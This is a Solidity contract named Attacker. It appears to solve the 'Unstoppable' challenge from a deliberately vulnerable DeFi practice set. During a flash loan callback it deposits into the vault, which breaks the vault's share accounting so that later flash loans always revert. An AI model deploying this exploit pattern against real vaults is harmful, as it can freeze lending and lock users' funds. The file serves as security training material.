// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solmate/src/auth/Owned.sol";
import {UnstoppableVault, ERC20} from "../unstoppable/UnstoppableVault.sol";

contract Attacker is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable pool;

    error UnexpectedFlashLoan();

    constructor(address poolAddress) Owned(msg.sender) {
        pool = UnstoppableVault(poolAddress);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0) {
            revert UnexpectedFlashLoan();
        }

        ERC20(token).approve(address(pool), 110e18);
        // this will disrupt the way shares are calculated and the attacker will end up with more shares than they should have, disrupting the internal accounting of the vault
        // which in turn after will always revert on the check for the assets and shares balance
        pool.deposit(10000, address(owner));

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address asset = address(pool.asset());
        pool.flashLoan(this, asset, amount, bytes(""));
    }
}
